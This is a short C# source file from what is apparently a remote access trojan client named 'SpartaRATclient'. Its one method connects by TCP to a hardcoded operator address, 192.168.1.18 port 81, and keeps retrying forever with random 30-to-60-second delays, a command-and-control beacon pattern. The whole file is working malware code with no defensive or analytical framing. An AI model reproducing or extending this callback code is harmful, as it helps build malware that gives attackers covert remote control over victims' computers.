using System;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using RATclientSparta.Server;
using RATclientSparta.Socket;

namespace SpartaRATclient
{
    public class ServerEndpoint
    {
        public static System.Net.Sockets.Socket Connect()
        {
            System.Net.Sockets.Socket ServerSocketObject = RATclientSparta.Socket.SocketServer.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint IPEndpoint = RATclientSparta.Socket.ClientEndPoint.Set("192.168.1.18", 81);

            while (true)
            {
                try
                {
                    ServerSocketObject.Connect(IPEndpoint);
                    return ServerSocketObject;
                }
                catch
                {
                    Random _ = new Random();
                    Thread.Sleep(_.Next(30000, 60000));
                }
            }
        }
    }
}